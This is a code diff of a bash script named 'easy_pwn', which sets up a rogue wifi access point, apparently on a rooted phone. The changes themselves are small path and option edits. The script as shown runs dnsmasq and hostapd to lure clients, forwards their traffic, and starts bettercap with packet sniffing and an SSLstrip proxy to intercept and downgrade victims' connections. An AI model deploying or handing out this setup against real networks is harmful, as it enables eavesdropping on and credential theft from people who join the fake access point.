@@ -1,21 +1,21 @@
 #!/bin/bash
 # easy_pwn : rogue access point script
 
-# load script settings
-. /opt/easy_pwn/scripts/rogue_ap/settings.sh
+# load easy_pwn settings
+. /mnt/easy_pwn/settings.sh
 
 echo "(chroot) [!] WARNING: make sure your wifi is enabled in connman"
 echo "             and not connected, also make sure your mobile data"
 echo "             is turned on."
 
-ip addr add 10.0.0.0/24 dev $WLAN_IF
+ip addr add 10.0.0.1/24 dev $WLAN_IF
 sleep 1
  
 # Start dnsmasq 
 echo "(chroot) [-] starting dnsmasq dhcp server..."
 if [ -z "$(ps -e | grep dnsmasq)" ]
 then
-	dnsmasq -C /opt/easy_pwn/scripts/rogue_ap/dnsmasq.conf
+	dnsmasq -C /mnt/easy_pwn/scripts/rogue_ap/dnsmasq.conf
 fi
 
 echo "(chroot) [-] forwarding $WLAN_IF traffic to mobile data..."
@@ -42,14 +42,10 @@ echo 2 > /sys/module/bcmdhd/parameters/op_mode
 
 # start hostpad
 echo "(chroot) [-] starting hostapd..."
-hostapd /opt/easy_pwn/scripts/rogue_ap/hostapd.conf &
-sleep 1
+hostapd -i $WLAN_IF /mnt/easy_pwn/scripts/rogue_ap/hostapd.conf &
+sleep 2
 
 # start bettercap with webui, sniffer and http proxy with SSLstrip
-echo "(chroot) [+] done. "
-echo " "
-sleep 1
-
 echo "(chroot) [-] starting bettercap"
 bettercap -caplet http-ui -iface $WLAN_IF --eval "net.sniff on;set http.proxy.sslstrip true;http.proxy on;"
 
